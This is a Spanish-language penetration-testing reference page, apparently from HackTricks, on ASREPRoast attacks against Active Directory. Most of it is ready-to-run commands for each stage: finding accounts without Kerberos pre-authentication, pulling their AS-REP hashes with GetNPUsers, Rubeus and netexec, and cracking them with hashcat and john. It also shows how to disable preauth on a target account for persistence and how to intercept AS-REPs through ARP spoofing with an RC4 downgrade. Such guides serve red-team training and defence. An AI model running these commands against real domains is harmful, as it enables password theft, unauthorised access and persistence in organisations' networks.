# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast es un ataque de seguridad que explota usuarios que carecen del **Kerberos pre-authentication required attribute**. Esencialmente, esta vulnerabilidad permite a un atacante solicitar la autenticación de un usuario al Controlador de Dominio (DC) sin necesitar la contraseña del usuario. El DC responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar romper offline para descubrir la contraseña del usuario.

Los requisitos principales para este ataque son:

- **Lack of Kerberos pre-authentication**: Los usuarios objetivo no deben tener esta característica de seguridad habilitada.
- **Connection to the Domain Controller (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
- **Optional domain account**: Tener una cuenta de dominio permite a los atacantes identificar usuarios vulnerables de forma más eficiente mediante consultas LDAP. Sin tal cuenta, los atacantes deben adivinar nombres de usuario.

#### Enumerar usuarios vulnerables (se requieren credenciales de dominio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensaje AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus generará un 4768 con un tipo de cifrado de 0x17 y tipo de preauth 0.

#### Comandos rápidos (Linux)

- Enumera primero posibles objetivos (p. ej., a partir de leaked build paths) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Extrae el AS-REP de un único usuario incluso con una contraseña **en blanco** usando `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec también muestra LDAP signing/channel binding posture).
- Crackea con `hashcat out.asreproast /path/rockyou.txt` – detecta automáticamente **-m 18200** (etype 23) para AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistencia

No es necesario forzar **preauth** para un usuario sobre el que tienes permisos **GenericAll** (o permisos para escribir propiedades):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sin credenciales

Un atacante puede usar una posición man-in-the-middle para capturar paquetes AS-REP mientras atraviesan la red sin depender de que Kerberos pre-authentication esté deshabilitado. Por lo tanto, funciona para todos los usuarios en la VLAN.\  
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta fuerza a las estaciones de trabajo cliente a usar RC4 alterando la negociación de Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
